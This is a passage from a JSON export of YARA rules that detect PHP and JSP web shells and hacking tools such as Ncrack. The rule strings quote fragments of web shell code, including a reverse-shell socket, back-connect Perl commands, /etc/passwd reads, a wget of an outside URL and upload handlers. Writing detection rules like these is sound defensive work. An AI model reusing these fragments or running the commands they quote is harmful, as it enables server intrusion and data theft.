data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp","minimum_yara":"1.7","name":"Webshell_JFolder_jfolder01_xxx_RID32B9","reference":"-","required_modules":[],"rule_hash":"53a734bb370e2676f3a7c7f3a451cc3d","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_reverse_jsp_RID30FA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:02:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"osw = new BufferedWriter(new OutputStreamWriter(os));\" fullword\n      $s7 = \"sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\" fullword\n      $s9 = \"isr = new BufferedReader(new InputStreamReader(is));\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 13:02:51","description":"Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp","minimum_yara":"1.7","name":"Webshell_jsp_reverse_jsp_RID30FA","reference":"-","required_modules":[],"rule_hash":"d6db6eec4c9347aa7e14f6ce3b5aabc8","score":50,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JFolder_jfolder01_jsp_leo_RID343D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:22:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"sbFolder.append(\\\"<tr><td >&nbsp;</td><td>\\\");\" fullword\n      $s1 = \"return filesize / intDivisor + \\\".\\\" + strAfterComma + \\\" \\\" + strUnit;\" fullword\n      $s5 = \"FileInfo fi = (FileInfo) ht.get(\\\"cqqUploadFile\\\");\" fullword\n      $s6 = \"<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"<%=strCmd%>\\\">\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 15:22:01","description":"Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp","minimum_yara":"1.7","name":"Webshell_JFolder_jfolder01_jsp_leo_RID343D","reference":"-","required_modules":[],"rule_hash":"a4434b684bff453b21d0647a3fe2d354","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2_RID369B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 17:03:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {\" fullword\n      $s6 = \"password = (String)session.getAttribute(\\\"password\\\");\" fullword\n      $s7 = \"insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\\\"GB231\" \n   condition: \n      2 of them\n}","date":"2014-01-28 17:03:01","description":"Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp","minimum_yara":"1.7","name":"Webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2_RID369B","reference":"-","required_modules":[],"rule_hash":"09ee241af75eb75e86904b7ca17f18e7","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx_RID39AE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 19:14:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI\" \n      $s11 = \"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC\" \n   condition: \n      all of them\n}","date":"2014-01-28 19:14:11","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx_RID39AE","reference":"-","required_modules":[],"rule_hash":"18735da5f7ca992c3427b3e155c0b1a9","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHPJackal_itsecteam_shell_RID3469 : DEMO MIDDLE_EAST T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:29:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MIDDLE_EAST, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$link=pg_connect(\\\"host=$host dbname=$db user=$user password=$pass\\\");\" fullword\n      $s6 = \"while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|\" \n      $s9 = \"while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+\" \n   condition: \n      2 of them\n}","date":"2014-01-28 15:29:21","description":"Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php","minimum_yara":"1.7","name":"Webshell_PHPJackal_itsecteam_shell_RID3469","reference":"-","required_modules":[],"rule_hash":"c420153747ce88bb95708a8f2d0f85fe","score":70,"tags":["T1100","DEMO","WEBSHELL","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule Webshell_Shell_Biz_c100_RID2F75 : DEMO T1087 T1100 T1105 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:58:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, T1105, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"if ($data{0} == \\\"\\\\x99\\\" and $data{1} == \\\"\\\\x01\\\") {return \\\"Error: \\\".$stri\" \n      $s3 = \"<OPTION VALUE=\\\"find /etc/ -type f -perm -o+w 2> /dev/null\\\"\" \n      $s4 = \"<OPTION VALUE=\\\"cat /proc/version /proc/cpuinfo\\\">CPUINFO\" fullword\n      $s7 = \"<OPTION VALUE=\\\"wget http://ftp.powernet.com.tr/supermail/de\" \n      $s9 = \"<OPTION VALUE=\\\"cut -d: -f1,2,3 /etc/passwd | grep ::\\\">USER\" \n   condition: \n      2 of them\n}","date":"2014-01-28 11:58:01","description":"Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php","minimum_yara":"1.7","name":"Webshell_Shell_Biz_c100_RID2F75","reference":"-","required_modules":[],"rule_hash":"623759504bc19d29fe8caf2352cef8bc","score":70,"tags":["T1100","DEMO","WEBSHELL","T1087","T1105"]},{"author":"Florian Roth","content":"rule Webshell_NIX_REMOTE_WEB_SHELL_RID30D4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:56:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<td><input size=\\\"48\\\" value=\\\"$docr/\\\" name=\\\"path\\\" type=\\\"text\\\"><input type=\" \n      $s2 = \"$uploadfile = $_POST['path'].$_FILES['file']['name'];\" fullword\n      $s6 = \"elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}\" fullword\n      $s7 = \"if ($_POST['path']==\\\"\\\"){$uploadfile = $_FILES['file']['name'];}\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 12:56:31","description":"Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php","minimum_yara":"1.7","name":"Webshell_NIX_REMOTE_WEB_SHELL_RID30D4","reference":"-","required_modules":[],"rule_hash":"a533ec78337d2ff197cceddca4c8f762","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_C99_w4cking_Shell_RID30C8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:54:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<b>HEXDUMP:</b><nobr>\" \n      $s4 = \"if ($filestealth) {$stat = stat($d.$f);}\" fullword\n      $s5 = \"while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \\\"<tr><td>\\\".$r\" \n      $s6 = \"if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \\\"DB \" \n      $s8 = \"echo \\\"<center><b>Server-status variables:</b><br><br>\\\";\" fullword\n      $s9 = \"echo \\\"<textarea cols=80 rows=10>\\\".htmlspecialchars($encoded).\\\"</textarea>\" \n   condition: \n      2 of them\n}","date":"2014-01-28 12:54:31","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_C99_w4cking_Shell_RID30C8","reference":"-","required_modules":[],"rule_hash":"ffdb873ed4da2940541771465456818e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpspy_2006_arabicspy_RID328E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:10:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$this -> addFile($content, $filename);\" fullword\n      $s3 = \"function addFile($data, $name, $time = 0) {\" fullword\n      $s8 = \"function unix2DosTime($unixtime = 0) {\" fullword\n      $s9 = \"foreach($filelist as $filename){\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 14:10:11","description":"Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php","minimum_yara":"1.7","name":"Webshell_phpspy_2006_arabicspy_RID328E","reference":"-","required_modules":[],"rule_hash":"74d49566d3d7c64db92dd876f112c4d0","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99_c99shell_RID2EC7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:29:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"  if (unlink(_FILE_)) {@ob_clean(); echo \\\"Thanks for using c99shell v.\\\".$shv\" \n      $s3 = \"  \\\"c99sh_backconn.pl\\\"=>array(\\\"Using PERL\\\",\\\"perl %path %host %port\\\"),\" fullword\n      $s4 = \"<br><TABLE style=\\\"BORDER-COLLAPSE: collapse\\\" cellSpacing=0 borderColorDark=#66\" \n      $s7 = \"   elseif (!$data = c99getsource($bind[\\\"src\\\"])) {echo \\\"Can't download sources\" \n      $s8 = \"  \\\"c99sh_datapipe.pl\\\"=>array(\\\"Using PERL\\\",\\\"perl %path %localport %remotehos\" \n      $s9 = \"   elseif (!$data = c99getsource($bc[\\\"src\\\"])) {echo \\\"Can't download sources!\" \n   condition: \n      2 of them\n}","date":"2014-01-28 11:29:01","description":"Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php","minimum_yara":"1.7","name":"Webshell_c99_c99shell_RID2EC7","reference":"-","required_modules":[],"rule_hash":"9680bfe04c3f38a92a26dabea154f156","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ok_style_1_JspSpy_RID3168 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:21:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"\\\"+f.canRead()+\\\" / \\\"+f.canWrite()+\\\" / \\\"+f.canExecute()+\\\"</td>\\\"+\" fullword\n      $s4 = \"out.println(\\\"<h2>File Manager - Current disk &quot;\\\"+(cr.indexOf(\\\"/\\\") == 0?\" \n      $s7 = \"String execute = f.canExecute() ? \\\"checked=\\\\\\\"checked\\\\\\\"\\\" : \\\"\\\";\" fullword\n      $s8 = \"\\\"<td nowrap>\\\"+f.canRead()+\\\" / \\\"+f.canWrite()+\\\" / \\\"+f.canExecute()+\\\"</td>\" \n   condition: \n      2 of them\n}","date":"2014-01-28 13:21:11","description":"Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp","minimum_yara":"1.7","name":"Webshell_ok_style_1_JspSpy_RID3168","reference":"-","required_modules":[],"rule_hash":"8b0aba454321225669be14d70b89ea2f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_queryDong_spyjsp2010_zend_RID343F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:22:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"return new Double(format.format(value)).doubleValue();\" fullword\n      $s5 = \"File tempF = new File(savePath);\" fullword\n      $s9 = \"if (tempF.isDirectory()) {\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 15:22:21","description":"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp","minimum_yara":"1.7","name":"Webshell_queryDong_spyjsp2010_zend_RID343F","reference":"-","required_modules":[],"rule_hash":"5e36749288d10bc4ef7038398c4aed3f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r57shell_antichat_RID3147 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:15:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"$res   = @mysql_query(\\\"SHOW CREATE TABLE `\\\".$_POST['mysql_tbl'].\\\"`\\\", $d\" \n      $s7 = \"$sql1 .= $row[1].\\\"\\\\r\\\\n\\\\r\\\\n\\\";\" fullword\n      $s8 = \"if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }\" fullword\n      $s9 = \"foreach($values as $k=>$v) {$values[$k] = addslashes($v);}\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 13:15:41","description":"Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php","minimum_yara":"1.7","name":"Webshell_r57shell_antichat_RID3147","reference":"-","required_modules":[],"rule_hash":"99b5d997ed386a85d60f186b6255ca1a","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx_RID360A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 16:38:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"BODY, TD, TR {\" fullword\n      $s5 = \"$d=str_replace(\\\"\\\\\\\\\\\",\\\"/\\\",$d);\" fullword\n      $s6 = \"if ($file==\\\".\\\" || $file==\\\"..\\\") continue;\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 16:38:51","description":"Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php","minimum_yara":"1.7","name":"Webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx_RID360A","reference":"-","required_modules":[],"rule_hash":"aa5357e0bcc7f63c60058e674a0626c9","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_css_dm_he1p_xxx_RID30B3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"String savePath = request.getParameter(\\\"savepath\\\");\" fullword\n      $s4 = \"URL downUrl = new URL(downFileUrl);\" fullword\n      $s5 = \"if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))\" fullword\n      $s6 = \"String downFileUrl = request.getParameter(\\\"url\\\");\" fullword\n      $s7 = \"FileInputStream fInput = new FileInputStream(f);\" fullword\n      $s8 = \"URLConnection conn = downUrl.openConnection();\" fullword\n      $s9 = \"sis = request.getInputStream();\" fullword\n   condition: \n      4 of them\n}","date":"2014-01-28 12:51:01","description":"Detects Web Shell from tennc webshell repo","minimum_yara":"1.7","name":"Webshell_css_dm_he1p_xxx_RID30B3","reference":"-","required_modules":[],"rule_hash":"dd27874f04432efcd85aeff768d219c8","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JSP_icesword_RID2F52 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:52:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\"></head>\" fullword\n      $s3 = \"<input type=\\\"hidden\\\" name=\\\"_EVENTTARGET\\\" value=\\\"\\\" />\" fullword\n      $s8 = \"<input type=\\\"hidden\\\" name=\\\"_EVENTARGUMENT\\\" value=\\\"\\\" />\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 11:52:11","description":"Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp","minimum_yara":"1.7","name":"Webshell_JSP_icesword_RID2F52","reference":"-","required_modules":[],"rule_hash":"4e8d48ea6ae64fdf4ee19470460a74cd","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_JFolder_JSP_2_RID2F29 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:45:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<table width=\\\"100%\\\" border=\\\"1\\\" cellspacing=\\\"0\\\" cellpadding=\\\"5\\\" bordercol\" \n      $s2 = \" KB </td>\" fullword\n      $s3 = \"<table width=\\\"98%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"\" \n      $s4 = \"<!-- <tr align=\\\"center\\\"> \" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:45:21","description":"Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp","minimum_yara":"1.7","name":"Webshell_JFolder_JSP_2_RID2F29","reference":"-","required_modules":[],"rule_hash":"13c78a4daf9b8c0ec56fc2a63e781294","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpspy_2006_PHPSPY_RID30B4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:51:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"http://www.4ngel.net\" fullword\n      $s5 = \"</a> | <a href=\\\"?action=phpenv\\\">PHP\" fullword\n      $s8 = \"echo $msg=@fwrite($fp,$_POST['filecontent']) ? \\\"\" fullword\n      $s9 = \"Codz by Angel\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 12:51:11","description":"Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php","minimum_yara":"1.7","name":"Webshell_phpspy_2006_PHPSPY_RID30B4","reference":"-","required_modules":[],"rule_hash":"f4ae997d06131bd972acee0b30c71724","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_browser_201_3_ma_ma2_download_RID3571 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 16:13:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"private static final int EDITFIELD_ROWS = 30;\" fullword\n      $s2 = \"private static String tempdir = \\\".\\\";\" fullword\n      $s6 = \"<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"<%=request.getAttribute(\\\"dir\\\")%>\\\"\" \n   condition: \n      2 of them\n}","date":"2014-01-28 16:13:21","description":"Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp","minimum_yara":"1.7","name":"Webshell_browser_201_3_ma_ma2_download_RID3571","reference":"-","required_modules":[],"rule_hash":"a061718b5231d72c8f0a99edeba93fc4","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_000_403_c5_queryDong_spyjsp2010_RID350B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:56:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"\\\" <select name='encode' class='input'><option value=''>ANSI</option><option val\" \n      $s7 = \"JSession.setAttribute(\\\"MSG\\\",\\\"<span style='color:red'>Upload File Failed!</spa\" \n      $s8 = \"File f = new File(JSession.getAttribute(CURRENT_DIR)+\\\"/\\\"+fileBean.getFileName(\" \n      $s9 = \"((Invoker)ins.get(\\\"vd\\\")).invoke(request,response,JSession);\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 15:56:21","description":"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp","minimum_yara":"1.7","name":"Webshell_000_403_c5_queryDong_spyjsp2010_RID350B","reference":"-","required_modules":[],"rule_hash":"03fbf125dede8dae1110e6a4be93aea2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r57shell127_r57_kartal_r57_RID338E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files r57shell127.php, r57_kartal.php, r57.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:52:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"$handle = @opendir($dir) or die(\\\"Can't open directory $dir\\\");\" fullword\n      $s3 = \"if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }\" fullword\n      $s5 = \"if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_\" \n   condition: \n      2 of them\n}","date":"2014-01-28 14:52:51","description":"Web Shell - from files r57shell127.php, r57_kartal.php, r57.php","minimum_yara":"1.7","name":"Webshell_r57shell127_r57_kartal_r57_RID338E","reference":"-","required_modules":[],"rule_hash":"6f8718d1490a81566e9ce7e9ab372f84","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_Fierce2_RID2B23 : DEMO HKTL {\n   meta:\n      description = \"This signature detects the Fierce2 domain scanner\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 08:53:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,\" \n   condition: \n      1 of them\n}","date":"2014-01-07 08:53:41","description":"This signature detects the Fierce2 domain scanner","minimum_yara":"1.7","name":"HKTL_Fierce2_RID2B23","reference":"-","required_modules":[],"rule_hash":"8b025f1c2147c7c14e93a0c3c280879f","score":60,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_Ncrack_RID2AF5 : DEMO HKTL T1110 {\n   meta:\n      description = \"This signature detects the Ncrack brute force tool\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = 